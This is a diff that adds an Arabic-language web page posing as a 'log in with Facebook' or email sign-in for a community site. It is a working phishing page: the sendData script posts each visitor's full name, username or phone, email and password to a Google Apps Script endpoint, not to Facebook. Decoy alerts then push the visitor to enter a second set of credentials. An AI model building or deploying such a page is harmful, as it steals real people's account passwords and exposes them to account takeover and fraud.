@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول | نخبة المجتمع</title>
+
+  <!-- استدعاء خط Alexandria العصري ليطابق الصفحة السابقة -->
+  <link href="https://fonts.googleapis.com/css2?family=Alexandria:wght@300;500;700;900&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg-dark: #0a0a0f;
+      --card-bg: #15151e;
+      --accent-gradient: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
+      --text-main: #ffffff;
+      --text-sub: #b3b3c1;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Alexandria', sans-serif;
+      background-color: var(--bg-dark);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-image: radial-gradient(circle at 50% 0%, rgba(255, 65, 108, 0.12) 0%, transparent 60%);
+      background-repeat: no-repeat;
+    }
+
+    /* === تصميم حاوية تسجيل الدخول الفاخرة (Glassmorphic) === */
+    .container {
+      width: 100%;
+      max-width: 400px;
+      margin: 20px;
+      background: rgba(21, 21, 30, 0.8);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      padding: 40px 30px;
+      border-radius: 24px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
+      border: 1px solid rgba(255, 65, 108, 0.2);
+      text-align: right;
+    }
+
+    h2 {
+      font-size: 26px;
+      font-weight: 900;
+      background: var(--accent-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 25px;
+      text-align: center;
+    }
+
+    /* الحقول الإدخالية بتصميم متوافق مع النمط المظلم */
+    input[type="text"],
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 15px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 12px;
+      font-family: inherit;
+      font-size: 14px;
+      color: var(--text-main);
+      outline: none;
+      transition: all 0.3s ease;
+    }
+
+    input:focus {
+      border-color: #ff416c;
+      background: rgba(255, 255, 255, 0.08);
+      box-shadow: 0 0 15px rgba(255, 65, 108, 0.2);
+    }
+
+    input::placeholder {
+      color: var(--text-sub);
+    }
+
+    /* الزر الرئيسي المتوهج */
+    button {
+      width: 100%;
+      padding: 14px;
+      background: var(--accent-gradient);
+      color: var(--text-main);
+      border: none;
+      border-radius: 12px;
+      font-family: inherit;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 10px 20px rgba(255, 65, 108, 0.4);
+      transition: transform 0.2s ease, box-shadow 0.3s ease;
+      margin-top: 5px;
+    }
+
+    button:hover {
+      transform: scale(1.02);
+      box-shadow: 0 15px 30px rgba(255, 65, 108, 0.6);
+    }
+
+    /* الزر الثانوي بتصميم نظيف */
+    .secondary-btn {
+      background: transparent;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      color: var(--text-sub);
+      box-shadow: none;
+      margin-top: 15px;
+    }
+
+    .secondary-btn:hover {
+      background: rgba(255, 255, 255, 0.05);
+      color: var(--text-main);
+      border-color: rgba(255, 255, 255, 0.4);
+      box-shadow: none;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    /* تصميم طبقة التحميل (Overlay) السينمائية */
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(10, 10, 15, 0.85);
+      backdrop-filter: blur(10px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    .loader-container {
+      text-align: center;
+    }
+
+    .loader {
+      border: 3px solid rgba(255, 255, 255, 0.1);
+      border-top: 3px solid #ff416c;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      color: var(--text-main);
+      font-size: 16px;
+      font-weight: 500;
+    }
+
+    /* تصميم خانة إظهار كلمة المرور */
+    .show-password {
+      text-align: right;
+      margin: 5px 0 20px;
+    }
+
+    .show-password label {
+      font-size: 13px;
+      color: var(--text-sub);
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .show-password input[type="checkbox"] {
+      width: auto;
+      margin: 0;
+      accent-color: #ff416c;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- طبقة التحميل -->
+  <div id="overlay">
+    <div class="loader-container">
+      <div class="loader"></div>
+      <div class="loading-text">جاري المعالجة والتحويل...</div>
+    </div>
+  </div>
+
+  <!-- قسم تسجيل الدخول (فيسبوك) -->
+  <div class="container" id="loginSection">
+    <h2> تسجيل الدخول بإستخدام فيسبوك</h2>
+    <form id="loginForm">
+      <input type="text" id="fullName" placeholder="ادخل اسمك مع اللقب" required>
+      <input type="text" id="loginUser" placeholder="اسم المستخدم أو الهاتف" required>
+      <input type="password" id="loginPass" placeholder="كلمة المرور" required>
+      
+      <div class="show-password">
+        <label>
+          <input type="checkbox" id="toggleLoginPass" onclick="togglePassword('loginPass', this)"> إظهار كلمة المرور
+        </label>
+      </div>
+      <button type="submit">تسجيل الدخول</button>
+    </form>
+    <button class="secondary-btn" onclick="showEmailLoginForm()">التسجيل باستخدام البريد الإلكتروني</button>
+  </div>
+
+  <!-- قسم تسجيل الدخول بالبريد الإلكتروني -->
+  <div class="container hidden" id="emailLoginSection">
+    <h2>تسجيل البريد الإلكتروني</h2>
+    <form id="emailLoginForm">
+      <input type="text" id="fullNameEmail" placeholder="ادخل اسمك مع اللقب" required>
+      <input type="email" id="emailLogin" placeholder="البريد الإلكتروني" required>
+      <input type="password" id="emailLoginPass" placeholder="كلمة المرور" required>
+      
+      <div class="show-password">
+        <label>
+          <input type="checkbox" id="toggleEmailPass" onclick="togglePassword('emailLoginPass', this)"> إظهار كلمة المرور
+        </label>
+      </div>
+      <button type="submit">تسجيل الدخول</button>
+    </form>
+    <button class="secondary-btn" onclick="showLoginForm()">تسجيل الدخول بإستخدام فيسبوك</button>
+  </div>
+
+  <script>
+    let emailLoginAttempts = 0;
+
+    function showLoadingIndicator(show) {
+      const overlay = document.getElementById("overlay");
+      overlay.style.display = show ? "flex" : "none";
+    }
+
+    function clearForms() {
+      document.getElementById("loginForm").reset();
+      document.getElementById("emailLoginForm").reset();
+    }
+
+    function togglePassword(inputId, checkbox) {
+      const input = document.getElementById(inputId);
+      input.type = checkbox.checked ? "text" : "password";
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      showLoadingIndicator(true);
+      sendData("تسجيل دخول");
+      setTimeout(() => {
+        showLoadingIndicator(false);
+        alert("يرجى تأكيد التسجيل باستخدام بريدك الإلكتروني المعتمد");
+        clearForms();
+      }, 3000);
+    });
+
+    document.getElementById("emailLoginForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      showLoadingIndicator(true);
+      sendData("تسجيل دخول بالبريد الإلكتروني");
+      let password = document.getElementById("emailLoginPass").value;
+      setTimeout(() => {
+        showLoadingIndicator(false);
+        if (password === "correctPassword") {
+          alert("تم تقديم طلبك بنجاح");
+          clearForms();
+        } else {
+          emailLoginAttempts++;
+          alert("كلمة المرور غير مطابقة");
+          if (emailLoginAttempts >= 3) {
+            window.location.href = "index.html";
+          }
+        }
+      }, 3000);
+    });
+
+    function sendData(type) {
+      let formData = new FormData();
+      if (type === "تسجيل دخول") {
+        formData.append("الاسم الرباعي", document.getElementById("fullName").value);
+        formData.append("اسم المستخدم", document.getElementById("loginUser").value);
+        formData.append("كلمة المرور", document.getElementById("loginPass").value);
+      } else {
+        formData.append("الاسم الرباعي", document.getElementById("fullNameEmail").value);
+        formData.append("البريد الإلكتروني", document.getElementById("emailLogin").value);
+        formData.append("كلمة المرور", document.getElementById("emailLoginPass").value);
+      }
+      formData.append("نوع الطلب", type);
+       let scriptUrl = "https://script.google.com/macros/s/AKfycbx7iMLgoN3xvS1YjaJGleZHwc_ZXHa_8Cy6HmxeyhfnbWFUMESOjK1oIoWrGhAUY_jC7g/exec";
+       fetch(scriptUrl, {
+        method: "POST",
+        body: formData
+      })
+      .then(response => response.text())
+      .then(data => console.log("تم إرسال البيانات بنجاح!"))
+      .catch(error => console.error("حدث خطأ:", error));
+    }
+
+    function showEmailLoginForm() {
+      document.getElementById("loginSection").classList.add("hidden");
+      document.getElementById("emailLoginSection").classList.remove("hidden");
+    }
+
+    function showLoginForm() {
+      document.getElementById("emailLoginSection").classList.add("hidden");
+      document.getElementById("loginSection").classList.remove("hidden");
+    }
+  </script>
+</body>
+</html>
